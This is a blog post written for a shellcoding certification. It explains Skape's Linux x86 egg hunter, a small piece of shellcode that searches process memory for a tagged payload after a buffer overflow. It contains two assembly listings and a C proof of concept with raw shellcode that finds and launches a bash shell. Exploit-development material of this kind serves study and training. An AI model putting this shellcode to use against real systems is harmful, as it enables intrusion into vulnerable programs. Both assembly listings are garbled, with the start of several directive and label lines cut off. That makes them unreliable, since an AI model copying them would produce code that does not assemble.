---
layout: post
title: " Skape's Egg Hunter (null-free/Linux x86) "
date: 2017-05-02 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 3_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---
 
_Note: Pretty much the entire post is extracted from Skape's paper, it's extremely well-written and is a must read._  


## What is an egghunter?

  
Assume you found a buffer overflow vulnerability with a very small space that you control that is less than that of a bind/reverse shell, how can you utilize this space? The following concept is discussed in depth by Skape in [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) where the actual payload is marked by an "egg" (usually 4-8 bytes that are very unlikely to be found in memory) and the small controllable space contains an "egghunter" which will search for that egg in the virtual address space.  
  
Skape discussed 3 different implementations for Linux, I implemented both `access(2)` and `access(2) revised`.  
  

## What are the requirements of an egg hunter?

* **Small size**: Since the main reason an egg hunter is needed is that we're tight on space, the smaller the shellcode is, the better. This is achieved by writing a very optimized shellcode.  

* **Robustness**: It should be able to scan the entire virtual space fast without failing on unallocated memory. This is achieved through multiple methods on Linux, discussed below.  
  
* If you directly try to read an unallocated memory in Linux, program will throw a SIGSEGV and crash. Instead, Skape recommended an out of the box suggestion, which is abusing the `access()` syscall.  
  
```cpp
int access(const char *pathname, int mode);  
```

Passing an address instead of pathname will check if the memory is allocated, if not it won't throw a `SIGSEGV`, allowing us to scan the memory safely.  
  
One more thing is that we need to make sure that the egg hunter won't ultimately point at itself, that's why the code will check the presence of the egg twice in a row before concluding that this is our payload.  

---

## How does the egg hunter work?

#### Method 1: access(2)  
  
```nasm
; Skape's egghunter: access(2)

al _start:  

ion .text  

rt:  
mov ebx, 0x50905090     ; Store EGG in ebx  
xor ecx, ecx            ; Zero out ECX  
mul ecx                 ; Zero out EAX and EDX  
age:                    ; JMP to increment page number  
or dx, 0xfff            ; Align page address  
ddr:                    ; JMP to increment address  
inc edx                 ; Go to next address  
pushad                  ; Push general registers onto stack  
lea ebx, [edx+4]        ; [edx+4] so we can compare [edx] and [edx+4] at the same time  
mov al, 0x21            ; syscall for access()  
int 0x80                ; call access() to check memory location [EBX]  
cmp al, 0xf2            ; Did it return EFAULT?  
popad                   ; Restore registers  
jz IncPage              ; access() returned EFAULT, skip page  
cmp [edx], ebx          ; initialized memory, check if EGG is in [edx]  
jnz IncAddr             ; EGG isn't in [edx], visit next address  
cmp [edx+4], ebx        ; EGG is found in [edx], is it in [edx+4] too?  
jne IncAddr             ; Boohoo! It wasn't. Visit next address  
jmp edx                 ; [edx][edx+4] contain EGGEGG, we found our shellcode! Execute meaningless EGGEGG instructions then our payload  
```    

  
#### Method 2: access(2) revised  
 
```nasm
; Skape's egghunter: access(2) revised  


al _start  

ion .text  

rt:  
xor edx, edx            ; EDX = 0  
age:  
or dx, 0xfff            ; Align page address  
ddr:  
inc edx                 ; Go to next address  
lea ebx, [edx+0x4]      ; [edx+4] so we can compare [edx] and [edx+4] at the same time  
push byte 0x21          ; syscall for access()  
pop eax  
int 0x80                ; call access() to check memory location [EBX]  
cmp al, 0xf2            ; Did it return EFAULT?  
jz IncPage              ; It did, skip page  
mov eax, 0x50905090     ; Store EGG in EAX  
mov edi, edx            ; Move EDX to EDI for scasd operation  
scasd                   ; Check if [EDI] == EAX then increment EDI  
jnz IncAddr             ; It isn't, increment address  
scasd                   ; Check if [EDI] == EAX then increment EDI  
jnz IncAddr             ; It isn't, increment address  
jmp edi                 ; We found our Egg! JMP to EDI, which points directly to our shellcode  
```

---

## Proof of concept

```cpp
/*  
 egghunter.c  
 By Abatchy  
 gcc egghunter.c -fno-stack-protector -z execstack -o shellcode.out  
*/  
  
#include <stdio.h>  
#include <string.h>  
  
#define EGG "\x90\x50\x90\x50"  
  
// Spawns a bash shell  
unsigned char secret[] = EGG EGG  
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";  
  
// Skape's egghunter: access(2)  
unsigned char egghunter1[] =   
"\xbb"  
EGG  
"\x31\xc9"  
"\xf7\xe1"  
"\x66\x81\xca\xff\x0f"  
"\x42"  
"\x60"  
"\x8d\x5a\x04"  
"\xb0\x21"  
"\xcd\x80"  
"\x3c\xf2"  
"\x61"  
"\x74\xed"  
"\x39\x1a"  
"\x75\xee"  
"\x39\x5a\x04"  
"\x75\xe9"  
"\xff\xe2";  
  
// Skape's egghunter: access(2) revised  
unsigned char egghunter2[] =   
"\x31\xd2"  
"\x66\x81\xca\xff\x0f"  
"\x42"  
"\x8d\x5a\x04"  
"\x6a\x21"  
"\x58"  
"\xcd\x80"  
"\x3c\xf2"  
"\x74\xee"  
"\xb8" EGG  
"\x89\xd7"  
"\xaf"  
"\x75\xe9"  
"\xaf"  
"\x75\xe6"  
"\xff\xe7";  
  
int main()  
{  
    printf("Egg is at %p\n", secret);  
    printf("Egghunter size: %d\n", strlen(egghunter1));  
    int (*ret)() = (int(*)())egghunter1;  
    ret();  
}  
```

  
Successfully running this code will search for the `EGG` in the memory and execute the payload, throwing a bash shell. Using `strace ./program` is a nice way to check if it's searching memory properly, or attaching GDB.  
  
\- Abatchy
